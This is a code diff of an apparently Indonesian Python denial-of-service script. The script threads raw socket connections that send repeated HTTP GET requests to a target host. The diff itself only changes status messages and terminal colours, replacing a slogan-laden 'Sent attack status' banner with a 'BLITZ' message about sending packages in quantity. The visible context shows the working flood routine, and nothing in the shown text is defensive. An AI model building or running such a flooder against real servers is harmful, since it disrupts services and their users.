@@ -65,7 +65,8 @@ def print_status():
 
     thread_num += 1
     #print output pada baris yang sama
-    sys.stdout.write(f"\033[1m{0} {time.ctime().split()[3]} [{str(thread_num)}]#-#-#BIRRUH BIDDAM NAFDHIKA YAA AQSHA  #-#-#Sent attack status|\033[0m")
+    sys.stdout.write(f" {time.ctime().split()[3]} [{str(thread_num)}]")
+    print(f"\033[33m{0} BLITZ ———> send packages in a specified quantity|\033[0m".format(ground))
     sys.stdout.flush()
     thread_num_mutex.release()
 
@@ -93,14 +94,14 @@ def attack():
         byt = (f"GET /{url_path} HTTP/1.1\nHost: {host}\n\n").encode()
         dos.send(byt)
     except socket.error:
-        print (f"\033[33m [ No connection, server may be down ]: {str(socket.error)}\033[0m")
+        print (f"\033[1m [ No connection, server may be down ]: {str(socket.error)}\033[0m")
     finally:
         # Tutup soket dengan rapi
         dos.shutdown(socket.SHUT_RDWR)
         dos.close()
 
 
-print (f"\033[33mSent massage {1 + 1}")
+print (f"Sent massage {1 + 1}")
 
 # Memunculkan thread per permintaan
 all_threads = []
